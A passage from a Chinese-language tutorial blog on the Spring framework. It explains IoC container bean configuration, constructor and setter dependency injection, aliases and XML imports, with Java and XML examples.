<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--    普通注入--&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;hello&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span> name=<span class="string">&quot;u1,u2&quot;</span>&gt;</span><br><span class="line">        &lt;constructor-arg name=<span class="string">&quot;str&quot;</span> value=<span class="string">&quot;www&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--        ref注入--&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean  id=<span class="string">&quot;address2&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.Address&quot;</span> /&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    &lt;bean <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.Student&quot;</span> id=<span class="string">&quot;student&quot;</span>&gt;</span><br><span class="line">&lt;!--数组注入--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;book&quot;</span>&gt;</span><br><span class="line">            &lt;array&gt;</span><br><span class="line">            &lt;value&gt;红楼梦&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;水浒传&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;三国演义&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;西游记&lt;/value&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--list注入--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;hobbies&quot;</span>&gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;起飞&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;起飞&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;起飞&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;起飞&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--        map注入--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;card&quot;</span>&gt;</span><br><span class="line">            &lt;map&gt;</span><br><span class="line">                &lt;entry key=<span class="string">&quot;身份证&quot;</span> value=<span class="string">&quot;440000000032001&quot;</span>/&gt;</span><br><span class="line">                &lt;entry key=<span class="string">&quot;银行卡&quot;</span> value=<span class="string">&quot;2213123032001&quot;</span>/&gt;</span><br><span class="line">            &lt;/map&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--        set注入--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;games&quot;</span>&gt;</span><br><span class="line">            &lt;set&gt;</span><br><span class="line">                &lt;value&gt;lol&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;cod&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;bot&lt;/value&gt;</span><br><span class="line">            &lt;/set&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=&quot;wife&quot; &gt;&lt;null/&gt;&lt;/property&gt;</span><br><span class="line">&lt;!--        配置注入--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;info&quot;</span>&gt;</span><br><span class="line">            &lt;props&gt;</span><br><span class="line">                &lt;prop key=&quot;username&quot;&gt;351452024&lt;/prop&gt;</span><br><span class="line">                &lt;prop key=&quot;password&quot;&gt;3125224&lt;/prop&gt;</span><br><span class="line">            &lt;/props&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>​    4.测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        获取spring的上下文对象</span></span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        接下来我们用Spring的管理即可</span></span><br><span class="line">        Student student = (Student) context.getBean(<span class="string">&quot;student&quot;</span>);</span><br><span class="line">        System.out.println(student.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h6 id="6-3其他方法注入"><a href="#6-3其他方法注入" class="headerlink" title="6.3其他方法注入"></a>6.3其他方法注入</h6><p>P,就是set注入，C就是创造器注入</p>
<h1 id="1-Spring的bean的本质"><a href="#1-Spring的bean的本质" class="headerlink" title="1.Spring的bean的本质"></a>1.Spring的bean的本质</h1><p>实际上就是反转，注入的值，创建对象全部交给Spring的XML来配置了！实际上就是利用Set注入</p>
<p>回顾昨天的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//我们照样是new 了一个新的对象</span></span><br><span class="line"><span class="keyword">package</span> com.ys.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserSQLServer</span> <span class="keyword">implements</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SQLSERVER use it&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>重写DAO层的方法，之后在service层当中进行操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写一个实现接口类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceimpl</span> <span class="keyword">implements</span> <span class="title">UserService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UserDao <span class="title">getUserDao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们这里设置了一个Set方法，让userDao允许用户的自定义创建，那么他需要什么我们就给什么~</p>
<p>最终测试类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ys.dao.UserDao;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserDaoimpl;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserMysql;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserSQLServer;</span><br><span class="line"><span class="keyword">import</span> com.ys.service.UserService;</span><br><span class="line"><span class="keyword">import</span> com.ys.service.UserServiceimpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInMine</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        用户实际调用的是业务层，Dao层不允许他们接触！</span></span><br><span class="line">        UserServiceimpl userServiceimpl = <span class="keyword">new</span> UserServiceimpl();</span><br><span class="line"></span><br><span class="line">        userServiceimpl.setUserDao(<span class="keyword">new</span> UserSQLServer());</span><br><span class="line"></span><br><span class="line">        userServiceimpl.getUser();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是在spring当中，spring帮我们操作了什么？</p>
<p>我们没有NEW任何一个类，我们做的是去Spring的bean下配置xml~</p>
<p>我们如下构造xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    使用spring来创建我们的对象,在spring中都成为Bean--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    现在一个Bean相当于new 了一个对象--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--   我们在XML当中去配置了--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userMySQL&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserMysql&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userOranle&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserOranle&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userSQLServer&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserSQLServer&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userServiceimpl&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.service.UserServiceimpl&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;userMySQL&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>bean 就相当于new了这么一个类，ref则是取bean当中已经创建好的类。</p>
<p>所以我们的测试代码修改后为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ys.service.UserServiceimpl;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInMine</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean1.xml&quot;</span>);</span><br><span class="line">        UserServiceimpl userServiceimpl = (UserServiceimpl) 		      context.getBean(<span class="string">&quot;userServiceimpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        userServiceimpl.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-IOC创建对象的方式"><a href="#2-IOC创建对象的方式" class="headerlink" title="2 IOC创建对象的方式"></a>2 IOC创建对象的方式</h1><p>1.使用无参构造 默认创建</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public User()&#123;</span></span><br><span class="line"><span class="comment">////        System.out.println(&quot;wdndmd&quot;);</span></span><br><span class="line"><span class="comment">////    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我在这直接将无参构造去除，那么就会出现无法构建的问题，但是Spring也支持使用有参构造</p>
<p>构造器函数有三种方式：</p>
<ul>
<li><p>第一种，下标赋值</p>
</li>
<li><pre><code class="xml">&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt;
    &lt;constructor-arg index=&quot;0&quot; value=&quot;wdnmd&quot;/&gt;
&lt;/bean&gt;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ 第二种，参数类型匹配</span><br><span class="line"></span><br><span class="line">+ &#96;&#96;&#96;xml</span><br><span class="line">  &lt;bean id&#x3D;&quot;user&quot; class&#x3D;&quot;com.ys.pojo.User&quot;&gt;</span><br><span class="line">      &lt;constructor-arg type&#x3D;&quot;java.lang.String&quot; value&#x3D;&quot;www&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;bean&gt;</span><br></pre></td></tr></table></figure></code></pre>
</li>
<li><p>通过参数名来进行赋值</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;www&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>要注意：</p>
<ul>
<li>我们如果使用了有参构造，spring就不会走无参构造的方法了</li>
<li>只要我们使用new ClassPathXmlApplicationContext创建，就会把XML当中的类全部注入进去，创建新类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserT</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;userT被创建了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserT</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如我们创建该java类</p>
<p>并在bean中扫描：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;user&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们便不会得到构造器应该返回那句话，但如果我们去掉上面的</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>则会得到构造器当中的话</p>
<p>同时我们要知道，我们创建的时候是一样的bean，对象并没有区别：</p>
<p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">User user = (User) context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">User user2 = (User)context.getBean(<span class="string">&quot;user&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>两者是是一样的。</p>
<p>所以在配置文件加载的时候，容器中管理的对象就已经初始化了</p>
<h1 id="3-Spring配置"><a href="#3-Spring配置" class="headerlink" title="3. Spring配置"></a>3. Spring配置</h1><h2 id="3-1-别名"><a href="#3-1-别名" class="headerlink" title="3.1 别名"></a>3.1 别名</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">alias</span> <span class="attr">name</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;dnm&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用这样就可以得到一个别名除此之外，我们也可以通过：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userT2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    User user = (User) context.getBean(<span class="string">&quot;user2&quot;</span>);</span><br><span class="line">    User user2 = (User)context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    System.out.println(user==user2);</span><br><span class="line">    user.show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试后是一样的</p>
<p>而且利用name的方式可以起多个别名</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user2,u2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="3-2-Bean的配置"><a href="#3-2-Bean的配置" class="headerlink" title="3.2 Bean的配置"></a>3.2 Bean的配置</h2><h2 id="3-3-import"><a href="#3-3-import" class="headerlink" title="3.3 import"></a>3.3 import</h2><p>import一般被我们用于使用团队开发使用，它可以将多个配置文件导入合并为一个，方便程序员之间互相协作。</p>
<p>例如我先创建了如下三个配置的xml：</p>
<p>beans1.xml ,applicationContext.xml 以及beans.xml</p>
<p>在main函数当中我却只想使用一个，该如何操作呢？，这样我们应该：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans1.xml&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后再回到Mytest当中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样就相当于一口气组织了三个xml文件</p>
<p>同时再回到前面的别名的使用，这样的别名便于我们import合并的时候将他们合并在一起，会阻止重复的情况</p>
<h1 id="4-依赖注入（DI）"><a href="#4-依赖注入（DI）" class="headerlink" title="4 依赖注入（DI）"></a>4 依赖注入（DI）</h1><h2 id="4-1-构造器注入"><a href="#4-1-构造器注入" class="headerlink" title="4.1 构造器注入"></a>4.1 构造器注入</h2><p>前面已经说过</p>
<h2 id="4-2-SET方式注入【重点】"><a href="#4-2-SET方式注入【重点】" class="headerlink" title="4.2 SET方式注入【重点】"></a>4.2 SET方式注入【重点】</h2><ul>
<li>依赖注入：本质就是set注入！<ul>
<li>依赖什么？<ul>
<li>bean对象的创建依赖于容器</li>
</ul>
</li>
<li>注入什么？<ul>
<li>bean对象中的所有属性由容器来注入</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>关于复杂类型之前，我们有必要明白list，set，map都是来做什么的，以及他们的区别</p>
<p>详细我决定写在JAVA基础里面。</p>
<p>【环境搭建】</p>
<p>1.复杂类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Address</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAddress</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2.真实测试对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String[] books;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; hobbies;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; cards;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games;</span><br><span class="line">    <span class="keyword">private</span> String wife;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br></pre></td></tr></table></figure>

<p>这些对象的各种注入方法：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Bean注入，使用ref--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;address1&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;books&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>Java基础<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>Java进程<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>Java编写<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JavaIOC<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JavaSpring<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cards&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;月曜&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1751111&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;月石&quot;</span> <span class="attr">value</span>=<span class="string">&quot;138217&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;games&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>战地<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>使命召唤<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>EA<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>奥里给<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>唱歌<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>下棋<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>睡觉<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;url&quot;</span>&gt;</span>/weibos?SSL=xxx<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 